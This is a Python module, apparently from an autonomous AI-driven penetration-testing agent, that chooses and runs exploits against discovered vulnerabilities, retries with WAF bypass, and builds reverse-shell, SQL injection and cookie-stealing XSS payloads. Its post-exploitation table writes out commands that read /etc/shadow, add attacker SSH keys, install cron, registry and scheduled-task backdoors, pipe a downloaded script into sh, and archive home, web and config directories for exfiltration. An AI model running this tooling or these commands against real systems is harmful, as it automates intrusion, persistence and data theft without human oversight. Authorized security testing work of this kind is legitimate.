"""
Exploitation Integration Module

Integrates the exploitation module with autonomous_agent.py and tool_manager.py

This module provides:
- ExploitationManager: High-level interface for exploitation phase
- Integration functions for existing agent components
- Exploit selection based on findings

Usage in autonomous_agent.py:
    from exploitation.integration import ExploitationManager
    
    # In __init__:
    self.exploitation_manager = ExploitationManager(self.tool_manager)
    
    # In exploitation phase:
    for finding in findings:
        result = await self.exploitation_manager.exploit_finding(finding, target_context)
        if result.shell_obtained:
            # Handle shell
"""

import logging
from typing import Dict, List, Any, Optional, Tuple

logger = logging.getLogger(__name__)

# Lazy imports to avoid circular dependencies
_exploit_db = None
_payload_crafter = None
_exploit_executor = None


def _get_exploit_db():
    global _exploit_db
    if _exploit_db is None:
        from .exploit_db import get_exploit_database
        _exploit_db = get_exploit_database()
    return _exploit_db


def _get_payload_crafter():
    global _payload_crafter
    if _payload_crafter is None:
        from .payload_crafter import get_payload_crafter
        _payload_crafter = get_payload_crafter()
    return _payload_crafter


def _get_exploit_executor(tool_manager=None):
    global _exploit_executor
    if _exploit_executor is None:
        from .exploit_executor import get_exploit_executor
        _exploit_executor = get_exploit_executor(tool_manager)
    return _exploit_executor


class ExploitationManager:
    """
    High-level interface for the exploitation phase.
    
    Integrates:
    - ExploitDatabase: Known exploit templates
    - PayloadCrafter: Payload generation
    - ExploitExecutor: Safe execution
    
    Usage:
        manager = ExploitationManager(tool_manager)
        
        # Exploit a specific finding
        result = await manager.exploit_finding(finding, context)
        
        # Get exploit for CVE
        template, command = manager.get_exploit_for_cve("CVE-2021-44228", context)
        
        # Craft payload
        payload = manager.craft_reverse_shell("10.10.14.1", 4444)
    """
    
    def __init__(self, tool_manager=None):
        """
        Initialize exploitation manager.
        
        Args:
            tool_manager: ToolManager instance for SSH execution
        """
        self.tool_manager = tool_manager
        self.exploit_db = _get_exploit_db()
        self.payload_crafter = _get_payload_crafter()
        self.executor = _get_exploit_executor(tool_manager)
        
        # Initialize LLM generator and strategic planner
        self.llm_generator = None
        self.strategic_planner = None
        self.exploit_chainer = None
        self.metasploit_client = None
        self.metasploit_db = None
        self.prompt_manager = None
        self.cve_database = None
        self.msf_manager = None
        try:
            from .llm_generator import get_llm_exploit_generator
            from .strategic_planner import get_strategic_planner
            from .exploit_chainer import get_exploit_chainer
            from .metasploit import get_metasploit_client, get_metasploit_db
            from .prompts import get_prompt_manager
            from .cve_templates import get_cve_database
            from .msf_manager import get_metasploit_manager
            self.llm_generator = get_llm_exploit_generator()
            self.strategic_planner = get_strategic_planner(self.llm_generator)
            self.exploit_chainer = get_exploit_chainer(self.executor, self.llm_generator, tool_manager)
            self.prompt_manager = get_prompt_manager()
            self.cve_database = get_cve_database()
            logger.info("[ExploitationManager] LLM components initialized")
            try:
                self.metasploit_client = get_metasploit_client()
                self.metasploit_db = get_metasploit_db()
                self.msf_manager = get_metasploit_manager()
                logger.info("[ExploitationManager] Metasploit components initialized")
            except Exception as e:
                logger.warning(f"[ExploitationManager] Metasploit not available: {e}")
        except Exception as e:
            logger.warning(f"[ExploitationManager] LLM components not available: {e}")
        
        # Track exploitation attempts
        self.exploitation_attempts: List[Dict] = []
        
        logger.info("[ExploitationManager] Initialized")
    
    def create_attack_plan(
        self,
        target: str,
        objective: str,
        vulnerabilities: List[Dict],
        context: Dict[str, Any] = None
    ) -> Optional[Dict]:
        """
        Create an attack plan based on discovered vulnerabilities.
        
        Args:
            target: Target URL/IP
            objective: Attack objective (shell, root, data, persistence)
            vulnerabilities: List of vulnerability findings
            context: Additional context (lhost, lport, etc.)
            
        Returns:
            Attack plan dictionary with steps
        """
        context = context or {}
        
        if not vulnerabilities:
            logger.warning("[ExploitationManager] No vulnerabilities to create plan from")
            return None
        
        # Use strategic planner if available
        if self.strategic_planner:
            try:
                plan = self.strategic_planner.create_plan(
                    target=target,
                    objective=objective,
                    vulnerabilities=vulnerabilities,
                    context=context
                )
                
                if plan:
                    return {
                        'plan_id': plan.plan_id,
                        'target': target,
                        'objective': objective,
                        'steps': [
                            {
                                'step_id': step.step_id,
                                'name': step.name,
                                'description': step.description,
                                'tool': step.tool,
                                'command': step.command,
                                'objective': step.objective.value if hasattr(step.objective, 'value') else str(step.objective),
                                'fallback_tools': getattr(step, 'fallback_steps', []),
                            }
                            for step in plan.steps
                        ],
                        'created_at': plan.created_at,
                    }
            except Exception as e:
                logger.error(f"[ExploitationManager] Strategic planner failed: {e}")
        
        # Fallback: Create simple plan based on vulnerability types
        return self._create_simple_attack_plan(target, objective, vulnerabilities, context)
    
    def _create_simple_attack_plan(
        self,
        target: str,
        objective: str,
        vulnerabilities: List[Dict],
        context: Dict[str, Any]
    ) -> Dict:
        """Create a simple attack plan without strategic planner"""
        import uuid
        from datetime import datetime
        
        steps = []
        
        for i, vuln in enumerate(vulnerabilities[:5]):  # Limit to top 5
            vuln_type = vuln.get('type', '').lower()
            
            step = {
                'step_id': str(uuid.uuid4())[:8],
                'name': f"Exploit {vuln_type}",
                'description': f"Attempt exploitation of {vuln_type}",
                'tool': self._get_tool_for_vuln(vuln_type),
                'command': self._get_command_for_vuln(vuln_type, vuln, context),
                'objective': objective,
                'fallback_tools': [],
            }
            steps.append(step)
        
        return {
            'plan_id': str(uuid.uuid4())[:8],
            'target': target,
            'objective': objective,
            'steps': steps,
            'created_at': datetime.now().isoformat(),
        }
    
    def _get_tool_for_vuln(self, vuln_type: str) -> str:
        """Get appropriate tool for vulnerability type"""
        tool_map = {
            'sql': 'sqlmap',
            'sqli': 'sqlmap',
            'sql_injection': 'sqlmap',
            'xss': 'xsstrike',
            'cross_site_scripting': 'xsstrike',
            'command_injection': 'commix',
            'rce': 'metasploit',
            'lfi': 'curl',
            'rfi': 'curl',
            'ssrf': 'curl',
            'file_upload': 'curl',
        }
        
        for key, tool in tool_map.items():
            if key in vuln_type:
                return tool
        
        return 'nuclei'
    
    def _get_command_for_vuln(self, vuln_type: str, vuln: Dict, context: Dict) -> str:
        """Get command for vulnerability exploitation"""
        target = context.get('target', vuln.get('url', ''))
        lhost = context.get('lhost', '10.10.14.1')
        lport = context.get('lport', 4444)
        
        if 'sql' in vuln_type:
            param = vuln.get('parameter', 'id')
            return f"sqlmap -u '{target}' -p {param} --batch --dump --level=3 --risk=3"
        elif 'xss' in vuln_type:
            return f"xsstrike -u '{target}' --crawl"
        elif 'command' in vuln_type or 'rce' in vuln_type:
            return f"commix -u '{target}' --batch --os-cmd='id'"
        elif 'lfi' in vuln_type:
            return f"curl -s '{target}?file=../../../../../../etc/passwd'"
        else:
            return f"nuclei -u '{target}' -t cves/ -severity critical,high"

    async def exploit_finding(
        self,
        finding: Dict[str, Any],
        context: Dict[str, Any],
        max_attempts: int = 3
    ) -> 'ExploitResult':
        """
        Attempt to exploit a vulnerability finding.
        
        Args:
            finding: Vulnerability finding from scanning phase
            context: Execution context (target, lhost, lport, etc.)
            max_attempts: Maximum exploitation attempts
            
        Returns:
            ExploitResult from best attempt
        """
        from .exploit_executor import ExploitResult, ExploitStatus
        
        # Get matching exploit template
        match = self.exploit_db.get_exploit_for_finding(finding, context)
        
        if not match:
            logger.warning(f"[ExploitationManager] No exploit found for finding: {finding.get('type', 'unknown')}")
            return ExploitResult(
                exploit_id="no_match",
                status=ExploitStatus.FAILED,
                command="",
                output="",
                execution_time=0,
                error_message="No matching exploit template found",
                recommendations=["Manual exploitation may be required"]
            )
        
        template, command = match
        
        # Track attempt
        attempt_info = {
            "finding_type": finding.get('type', 'unknown'),
            "template_id": template.exploit_id,
            "context": {k: v for k, v in context.items() if k not in ['password', 'credentials']},
        }
        self.exploitation_attempts.append(attempt_info)
        
        # Execute exploit
        result = await self.executor.execute_template(template, context)
        
        # If failed and more attempts allowed, try variations
        if not result.is_success and max_attempts > 1:
            # Try with WAF bypass
            if result.status.value == "blocked":
                logger.info("[ExploitationManager] Trying WAF bypass...")
                bypass_context = context.copy()
                bypass_context['waf_bypass'] = True
                result = await self.executor.execute_template(template, bypass_context)
            
            # Try alternative exploits
            if not result.is_success:
                alternatives = self._get_alternative_exploits(finding, template.exploit_id)
                for alt_template in alternatives[:max_attempts - 1]:
                    logger.info(f"[ExploitationManager] Trying alternative: {alt_template.exploit_id}")
                    alt_result = await self.executor.execute_template(alt_template, context)
                    if alt_result.is_success:
                        result = alt_result
                        break
        
        return result
    
    def get_exploit_for_cve(
        self,
        cve_id: str,
        context: Dict[str, Any]
    ) -> Optional[Tuple['ExploitTemplate', str]]:
        """
        Get exploit template and command for a CVE.
        
        Args:
            cve_id: CVE identifier (e.g., "CVE-2021-44228")
            context: Execution context
            
        Returns:
            Tuple of (ExploitTemplate, command) or None
        """
        templates = self.exploit_db.get_by_cve(cve_id)
        if not templates:
            return None
        
        # Get most reliable
        template = max(templates, key=lambda t: t.reliability)
        command = template.build_command(context)
        
        return template, command
    
    def get_exploit_for_service(
        self,
        service: str,
        context: Dict[str, Any]
    ) -> List[Tuple['ExploitTemplate', str]]:
        """
        Get all exploits for a service.
        
        Args:
            service: Service name (e.g., "wordpress", "apache")
            context: Execution context
            
        Returns:
            List of (ExploitTemplate, command) tuples
        """
        templates = self.exploit_db.get_by_service(service)
        return [(t, t.build_command(context)) for t in templates]
    
    def craft_reverse_shell(
        self,
        lhost: str,
        lport: int,
        shell_type: str = "bash",
        encoded: bool = False
    ) -> str:
        """
        Craft a reverse shell payload.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            shell_type: Type of shell (bash, python, php, etc.)
            encoded: Whether to base64 encode
            
        Returns:
            Shell payload string
        """
        from .payload_crafter import ShellType, EncodingType
        
        shell_map = {
            "bash": ShellType.BASH,
            "sh": ShellType.SH,
            "python": ShellType.PYTHON,
            "python3": ShellType.PYTHON3,
            "php": ShellType.PHP,
            "perl": ShellType.PERL,
            "ruby": ShellType.RUBY,
            "nc": ShellType.NC,
            "powershell": ShellType.POWERSHELL,
        }
        
        shell_enum = shell_map.get(shell_type.lower(), ShellType.BASH)
        encoding = EncodingType.BASE64 if encoded else EncodingType.NONE
        
        payload = self.payload_crafter.craft_reverse_shell(
            shell_type=shell_enum,
            lhost=lhost,
            lport=lport,
            encoding=encoding
        )
        
        return payload.payload
    
    def craft_sqli_payload(
        self,
        injection_type: str = "union_basic",
        columns: int = 5,
        waf_bypass: bool = False
    ) -> str:
        """
        Craft a SQL injection payload.
        
        Args:
            injection_type: Type of injection
            columns: Number of columns for UNION
            waf_bypass: Apply WAF bypass
            
        Returns:
            SQLi payload string
        """
        payload = self.payload_crafter.craft_sqli(
            injection_type=injection_type,
            columns=columns,
            waf_bypass=waf_bypass
        )
        
        return payload.payload
    
    def craft_xss_payload(
        self,
        xss_type: str = "basic_script",
        callback: str = None
    ) -> str:
        """
        Craft an XSS payload.
        
        Args:
            xss_type: Type of XSS payload
            callback: Callback URL for stealing
            
        Returns:
            XSS payload string
        """
        payload = self.payload_crafter.craft_xss(
            xss_type=xss_type,
            callback=callback
        )
        
        return payload.payload
    
    def _get_alternative_exploits(
        self,
        finding: Dict[str, Any],
        exclude_id: str
    ) -> List['ExploitTemplate']:
        """Get alternative exploit templates for a finding"""
        from .exploit_db import ExploitCategory
        
        alternatives = []
        
        # Get by vulnerability type
        vuln_type = finding.get('type', '').lower()
        type_to_category = {
            'sql_injection': ExploitCategory.WEB_INJECTION,
            'sqli': ExploitCategory.WEB_INJECTION,
            'xss': ExploitCategory.WEB_XSS,
            'command_injection': ExploitCategory.WEB_INJECTION,
            'lfi': ExploitCategory.WEB_FILE_INCLUSION,
            'rfi': ExploitCategory.WEB_FILE_INCLUSION,
        }
        
        category = type_to_category.get(vuln_type)
        if category:
            templates = self.exploit_db.get_by_category(category)
            alternatives = [t for t in templates if t.exploit_id != exclude_id]
        
        # Sort by reliability
        alternatives.sort(key=lambda t: t.reliability, reverse=True)
        
        return alternatives[:5]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get exploitation statistics"""
        return {
            "total_attempts": len(self.exploitation_attempts),
            "executor_stats": self.executor.get_execution_stats(),
            "templates_available": len(self.exploit_db.templates),
        }


# ============================================================================
# Integration helpers for autonomous_agent.py
# ============================================================================

def get_exploitation_manager(tool_manager=None) -> ExploitationManager:
    """Get or create ExploitationManager instance"""
    return ExploitationManager(tool_manager)


def enrich_tool_command_with_exploit(
    tool_name: str,
    target: str,
    finding: Dict[str, Any] = None,
    context: Dict[str, Any] = None
) -> Optional[str]:
    """
    Get enhanced command for a tool based on exploit knowledge.
    
    Can be used in tool_manager.py to enhance command generation.
    
    Args:
        tool_name: Name of the tool
        target: Target URL/IP
        finding: Optional finding to exploit
        context: Additional context
        
    Returns:
        Enhanced command or None
    """
    db = _get_exploit_db()
    context = context or {}
    context['target'] = target
    
    # Get templates for this tool
    templates = db.get_by_tool(tool_name)
    
    if not templates:
        return None
    
    # If we have a finding, try to match
    if finding:
        match = db.get_exploit_for_finding(finding, context)
        if match:
            template, command = match
            return command
    
    # Otherwise return most reliable template for this tool
    template = max(templates, key=lambda t: t.reliability)
    return template.build_command(context)


def get_post_exploitation_commands(
    shell_type: str = "linux",
    objective: str = "enumerate"
) -> List[str]:
    """
    Get post-exploitation commands based on objective.
    
    Args:
        shell_type: Type of shell (linux, windows)
        objective: What to do (enumerate, persist, privesc, exfil)
        
    Returns:
        List of commands to run
    """
    linux_commands = {
        "enumerate": [
            "id",
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "cat /etc/shadow 2>/dev/null",
            "sudo -l",
            "find / -perm -4000 2>/dev/null",
            "netstat -tulpn",
            "ps aux",
            "crontab -l",
            "ls -la /home/",
            "cat /etc/crontab",
            "env",
        ],
        "persist": [
            "echo 'ssh-rsa AAAA... attacker@host' >> ~/.ssh/authorized_keys",
            "crontab -l > /tmp/cron; echo '* * * * * /tmp/backdoor.sh' >> /tmp/cron; crontab /tmp/cron",
        ],
        "privesc": [
            "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "find / -perm -4000 2>/dev/null",
            "cat /etc/sudoers",
            "ls -la /etc/passwd /etc/shadow",
        ],
        "exfil": [
            "tar czf /tmp/data.tar.gz /home/ /var/www/ /etc/",
            "cat /tmp/data.tar.gz | base64",
        ],
    }
    
    windows_commands = {
        "enumerate": [
            "whoami /all",
            "systeminfo",
            "net user",
            "net localgroup administrators",
            "netstat -ano",
            "tasklist",
            "dir C:\\Users\\",
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        ],
        "persist": [
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe",
            "schtasks /create /tn Backdoor /tr C:\\backdoor.exe /sc onstart",
        ],
        "privesc": [
            "winpeas.exe",
            "whoami /priv",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        ],
    }
    
    commands = linux_commands if shell_type.lower() == "linux" else windows_commands
    return commands.get(objective, commands["enumerate"])
